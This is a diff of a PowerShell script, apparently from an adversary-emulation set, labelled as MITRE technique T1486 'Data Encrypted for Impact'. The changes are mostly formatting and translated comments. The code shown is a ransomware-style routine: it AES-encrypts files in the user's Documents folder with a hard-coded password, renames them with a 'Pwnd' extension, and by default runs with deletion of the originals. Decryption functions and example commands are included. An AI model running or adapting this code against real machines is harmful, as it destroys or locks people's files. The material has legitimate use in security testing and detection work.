@@ -5,10 +5,10 @@ Write-Output "==================================================================
 Write-Output " DATA Encrypted for impact (T1486)"
 Write-Output "==============================================================================="
 ################ [ GLOBAL VARIABLES ] ################
-$PathToManage  = "$env:USERPROFILE\Documents";
-$FilesMgmt      = "$env:PUBLIC\exf\Files_mgmt.txt";
-$EncryptionKey  = "Encrypt!on-K3y"
-$NewExtension   = "Pwnd"
+$PathToManage = "$env:USERPROFILE\Documents";
+$FilesMgmt = "$env:PUBLIC\exf\Files_mgmt.txt";
+$EncryptionKey = "Encrypt!on-K3y"
+$NewExtension = "Pwnd"
 $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
 
 ################ [ FUNCTIONS ] ################
@@ -16,16 +16,13 @@ $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
 # Function to encrypt a file in AES
 function EncryptFileAES {
     param(
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$InputFile,
-        
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$OutputFile,
-        
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [byte[]]$Key,
-        
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [byte[]]$IVParameter
     )
     
@@ -56,7 +53,7 @@ function EncryptFileAES {
         return $true
     }
     catch {
-        Write-output "Encryption failure for file : $InputFile error code : $($_.Exception.Message)"| Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+        Write-output "Encryption failure for file : $InputFile error code : $($_.Exception.Message)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         return $false
     }
 }
@@ -64,10 +61,9 @@ function EncryptFileAES {
 # Fucntion to create a key from a password
 function GetKeyFromPassword {
     param(
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [String]$Password,
-        [byte[]]$Salt = @(0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76),
-        
+        [byte[]]$Salt = @(0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76),    
         [int]$Iterations = 10000
     )
     
@@ -78,20 +74,12 @@ function GetKeyFromPassword {
 # Function to encrypt files in a directory.
 function EncryptFiles {
     param(
-    #    [Parameter(Mandatory=$true)]
         [string]$DirectoryPath = $PathToManage,
-        
-    #    [Parameter(Mandatory=$true)]
         [string]$Password = $EncryptionKey,
-
-        
         [string]$FileFilter = "*.*",
-        
         [switch]$Recursive,
-        
         [switch]$DeleteOriginal,
-        
-        [string]$OutputSuffix = "."+$NewExtension
+        [string]$OutputSuffix = "." + $NewExtension
     )
     
     # Check that directory exists
@@ -173,13 +161,13 @@ function EncryptFiles {
 # Function to decrypt a file.
 function DecryptFileAES {
     param(
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$InputFile,
         
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$OutputFile,
         
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [byte[]]$Key
     )
     
@@ -221,13 +209,13 @@ function DecryptFileAES {
 # Function to decrypt files in a directory
 function DecryptFiles {
     param(
-       # [Parameter(Mandatory=$true)]
+        # [Parameter(Mandatory=$true)]
         [string]$DirectoryPath = $PathToManage,
         
         #[Parameter(Mandatory=$true)]
         [string]$Password = $EncryptionKey,
-        $MatchEndingExtension = "\."+$NewExtension+"$",       
-        [string]$EncryptedSuffix =  "."+$NewExtension,
+        $MatchEndingExtension = "\." + $NewExtension + "$",       
+        [string]$EncryptedSuffix = "." + $NewExtension,
         
         [switch]$Recursive,
         
@@ -258,18 +246,18 @@ Write-output "-------------------------------------"  | Out-File -FilePath "$Fil
 EncryptFiles -DeleteOriginal
 
 ################ [ EXAMPLES ] ################
-# Chiffrer tous les fichiers .txt dans un dossier
-#EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -FileFilter "*.txt" -Recursive
 
-# Chiffrer récursivement tous les fichiers et supprimer les originaux
-#EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -Recursive -DeleteOriginal
+# Encrypt all .txt files in mentioned directory
+#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.txt" -Password "MyPassw0rd23!"
 
-# Déchiffrer les fichiers
-#DecryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -Recursive
-
-#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.txt"
-
+# Encrypt all .txt files in mentioned directory and remove orginal files
 #EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.pdf" -DeleteOriginal
 
+# Encrypt recursively all .txt files in mentioned directory and remove orginal files 
+#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.pdf" -DeleteOriginal -Recursive
+
+#Decrypt encrypted files commands sames parameters as previous commands.
 # DecryptFiles -DirectoryPath "C:\xxxx" -Recursive 
 # DecryptFiles -DirectoryPath "C:\xxxx" -Recursive -DeleteEncrypted
+
+# if no parameters are passed the defined password and directory are defined at the beginning of this script.
